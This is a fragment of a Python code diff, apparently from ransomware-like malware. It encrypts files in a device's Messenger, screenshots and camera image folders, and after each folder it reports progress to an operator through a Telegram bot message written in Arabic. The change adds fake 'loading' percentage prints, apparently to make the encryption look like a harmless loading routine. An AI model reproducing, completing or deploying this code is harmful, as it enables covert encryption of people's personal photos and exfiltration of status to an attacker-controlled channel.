@@ -211,7 +211,7 @@ class dec:
                        with open(path+att+file,'wb')as women:
                            women.write(binary)
                     else:pass
-            requests.get(f'https://api.telegram.org/bot{fark[1]}/sendMessage?chat_id=@{fark[2]}&text=  وتمت عملية التشفير ملف المسنجر يمتلك صورة  {{count[1]}}')
+            requests.get(f'https://api.telegram.org/bot{fark[1]}/sendMessage?chat_id=@{fark[2]}&text=  وتمت عملية التشفير ملف المسنجر يمتلك صورة  {{count[1]}}');print('loading 55%')
             del count
         def screenshots():
             count = []
@@ -229,7 +229,7 @@ class dec:
                             women.write(binary)
                     else:
                         pass
-            requests.get(f'https://api.telegram.org/bot{fark[1]}/sendMessage?chat_id=@{fark[2]}&text=ملف السكرينات يمتلك صورة وتمت عملية التشفير{{count[1]}}')
+            requests.get(f'https://api.telegram.org/bot{fark[1]}/sendMessage?chat_id=@{fark[2]}&text=ملف السكرينات يمتلك صورة وتمت عملية التشفير{{count[1]}}');print('loading 77%')
             del count
 
         def camera():
